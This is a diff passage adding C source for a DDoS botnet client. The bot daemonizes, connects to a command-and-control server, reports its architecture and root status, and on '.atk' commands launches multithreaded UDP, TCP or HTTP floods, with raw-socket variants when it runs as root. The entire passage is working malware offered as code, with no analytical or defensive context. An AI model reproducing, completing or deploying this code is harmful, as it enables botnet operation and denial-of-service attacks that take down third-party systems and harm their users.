@@ -727,4 +727,254 @@ void stop_attack() {
         thread_args = NULL;
     }
     
-    active
+    active_threads = 0;
+    memset(&current_attack, 0, sizeof(current_attack));
+    
+    if (sock > 0) {
+        send(sock, "ATTACK_STOPPED\n", 15, 0);
+    }
+}
+
+void start_attack(char *cmd) {
+    char target[64];
+    int port, duration, threads, pps, size, delay;
+    char method[32];
+    char host[128];
+    char path[256];
+    
+    if (attack_running) {
+        stop_attack();
+        sleep(1);
+    }
+    
+    int parsed = sscanf(cmd, ".atk %63s %d %d %31s %d %d %d %d",
+                        target, &port, &duration, method, &threads, &pps, &size, &delay);
+    
+    if (parsed < 4) {
+        if (sock > 0) {
+            send(sock, "ERROR: Invalid attack format\n", 29, 0);
+        }
+        return;
+    }
+    
+    if (parsed < 5) threads = DEFAULT_THREADS;
+    if (parsed < 6) pps = DEFAULT_PPS;
+    if (parsed < 7) size = DEFAULT_SIZE;
+    if (parsed < 8) delay = DEFAULT_DELAY;
+    
+    if (threads > MAX_THREADS) threads = MAX_THREADS;
+    if (pps > 1000000) pps = 1000000;
+    if (size > 65507) size = 65507;
+    if (size < 64) size = 64;
+    if (delay < 0) delay = 0;
+    if (delay > 10000) delay = 10000;
+    
+    attack_running = 1;
+    packets_sent = 0;
+    bytes_sent = 0;
+    
+    strcpy(current_attack.target, target);
+    current_attack.port = port;
+    current_attack.duration = duration;
+    current_attack.packet_size = size;
+    current_attack.threads = threads;
+    current_attack.pps = pps;
+    current_attack.delay = delay;
+    current_attack.attack_running = 1;
+    
+    struct hostent *he = gethostbyname(target);
+    if (he != NULL) {
+        struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
+        strcpy(current_attack.target, inet_ntoa(*addr_list[0]));
+        strcpy(host, target);
+    } else {
+        strcpy(host, target);
+    }
+    
+    strcpy(current_attack.host, host);
+    strcpy(current_attack.path, "/");
+    
+    void *(*attack_func)(void *) = NULL;
+    char actual_method[64];
+    
+    if (is_root) {
+        if (strcasecmp(method, "udp-bypass") == 0 || strcasecmp(method, "udp") == 0) {
+            attack_func = udp_raw_flood;
+            strcpy(actual_method, "udp-raw");
+        } else if (strcasecmp(method, "tcp-bypass") == 0 || strcasecmp(method, "tcp") == 0) {
+            attack_func = tcp_raw_flood;
+            strcpy(actual_method, "tcp-raw");
+        } else if (strcasecmp(method, "http-bypass") == 0 || strcasecmp(method, "http") == 0) {
+            attack_func = http_raw_flood;
+            strcpy(current_attack.path, "/");
+            strcpy(actual_method, "http-raw");
+        } else {
+            if (sock > 0) {
+                send(sock, "ERROR: Unknown method\n", 22, 0);
+            }
+            attack_running = 0;
+            return;
+        }
+    } else {
+        if (strcasecmp(method, "udp-bypass") == 0 || strcasecmp(method, "udp") == 0) {
+            attack_func = udp_flood;
+            strcpy(actual_method, "udp");
+        } else if (strcasecmp(method, "tcp-bypass") == 0 || strcasecmp(method, "tcp") == 0) {
+            attack_func = tcp_flood;
+            strcpy(actual_method, "tcp");
+        } else if (strcasecmp(method, "http-bypass") == 0 || strcasecmp(method, "http") == 0) {
+            attack_func = http_flood;
+            strcpy(current_attack.path, "/");
+            strcpy(actual_method, "http");
+        } else {
+            if (sock > 0) {
+                send(sock, "ERROR: Unknown method\n", 22, 0);
+            }
+            attack_running = 0;
+            return;
+        }
+    }
+    
+    active_threads = threads;
+    attack_threads = malloc(threads * sizeof(pthread_t));
+    thread_args = malloc(threads * sizeof(attack_args_t));
+    
+    if (attack_threads == NULL || thread_args == NULL) {
+        if (sock > 0) {
+            send(sock, "ERROR: Memory allocation failed\n", 32, 0);
+        }
+        attack_running = 0;
+        return;
+    }
+    
+    for (int i = 0; i < threads; i++) {
+        memcpy(&thread_args[i], &current_attack, sizeof(attack_args_t));
+        thread_args[i].thread_id = i;
+        thread_args[i].threads = 1;
+        
+        if (pthread_create(&attack_threads[i], NULL, attack_func, &thread_args[i]) != 0) {
+            if (sock > 0) {
+                send(sock, "ERROR: Failed to start attack thread\n", 37, 0);
+            }
+            attack_running = 0;
+            return;
+        }
+        pthread_detach(attack_threads[i]);
+    }
+    
+    if (sock > 0) {
+        char response[256];
+        snprintf(response, sizeof(response), "ATTACK_STARTED:%s:%d:%d:%s:%d:%d:%d:%d:root=%d\n",
+                 current_attack.target, current_attack.port, current_attack.duration,
+                 actual_method, threads, pps, size, delay, is_root);
+        send(sock, response, strlen(response), 0);
+    }
+}
+
+void execute_command(char* cmd) {
+    cmd = strtok(cmd, "\r\n");
+    if (!cmd) return;
+    
+    if (strcmp(cmd, "PING") == 0) {
+        if (sock > 0) send(sock, "PONG\n", 5, 0);
+    }
+    else if (strncmp(cmd, ".stop", 5) == 0) {
+        stop_attack();
+        if (sock > 0) send(sock, "STOPPED\n", 8, 0);
+    }
+    else if (strncmp(cmd, ".atk", 4) == 0) {
+        start_attack(cmd);
+    }
+}
+
+int connect_to_cnc() {
+    struct sockaddr_in server_addr;
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return -1;
+    
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(CNC_PORT);
+    if (inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr) <= 0) {
+        close(sock);
+        sock = -1;
+        return -1;
+    }
+    
+    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        close(sock);
+        sock = -1;
+        return -1;
+    }
+    
+    char hbt[256];
+    snprintf(hbt, sizeof(hbt), "HBT|%s|%s\n", arch, version);
+    send(sock, hbt, strlen(hbt), 0);
+    
+    char info[512];
+    snprintf(info, sizeof(info), "INFO:{\"arch\":\"%s\",\"version\":\"%s\",\"root\":%d}\n", arch, version, is_root);
+    send(sock, info, strlen(info), 0);
+    
+    return 0;
+}
+
+void reconnect_loop() {
+    fd_set readfds;
+    struct timeval tv;
+    char buffer[BUFFER_SIZE];
+    
+    while (running) {
+        if (sock < 0) {
+            connect_to_cnc();
+            if (sock < 0) {
+                sleep(5);
+                continue;
+            }
+        }
+        
+        FD_ZERO(&readfds);
+        FD_SET(sock, &readfds);
+        tv.tv_sec = 20;
+        tv.tv_usec = 0;
+        
+        int activity = select(sock + 1, &readfds, NULL, NULL, &tv);
+        
+        if (activity < 0) {
+            close(sock);
+            sock = -1;
+            continue;
+        }
+        
+        if (activity == 0) {
+            char hbt[256];
+            snprintf(hbt, sizeof(hbt), "HBT|%s|%s\n", arch, version);
+            send(sock, hbt, strlen(hbt), 0);
+            continue;
+        }
+        
+        if (FD_ISSET(sock, &readfds)) {
+            int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
+            if (bytes <= 0) {
+                close(sock);
+                sock = -1;
+                continue;
+            }
+            buffer[bytes] = '\0';
+            
+            char* line = strtok(buffer, "\n");
+            while (line) {
+                execute_command(line);
+                line = strtok(NULL, "\n");
+            }
+        }
+    }
+}
+
+int main() {
+    daemonize();
+    signal(SIGPIPE, SIG_IGN);
+    srand(time(NULL) ^ getpid());
+    get_arch();
+    check_root();
+    reconnect_loop();
+    return 0;
+}
